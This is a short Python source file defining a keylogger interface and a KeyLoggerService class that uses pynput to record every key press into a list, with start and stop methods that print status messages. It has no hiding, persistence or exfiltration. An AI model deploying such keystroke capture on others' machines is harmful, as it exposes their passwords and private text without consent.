from pynput.keyboard import Listener,Key
from abc import ABC, abstractmethod
from typing import List
import time

class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self) -> None: 
        pass
     
    @abstractmethod
    def stop_logging(self) -> None: 
        pass
     
    @abstractmethod
    def get_logged_keys(self) -> List[str]: 
        pass




class KeyLoggerService (IKeyLogger):
    def __init__(self):
        self.logged_keys: List[str] = []
        self.listener = None

    def on_press(self, key):
        try:
            self.logged_keys.append(key.char)
        except AttributeError:
            self.logged_keys.append(str(key))

    def start_logging(self) -> None:
        self.listener = Listener(on_press=self.on_press)
        self.listener.start()
        print("Logging started!")

    def stop_logging(self) -> None:
        if self.listener:
            self.listener.stop()
            print("Logging stopped!")

    def get_logged_keys(self) -> List[str]:
        return self.logged_keys 
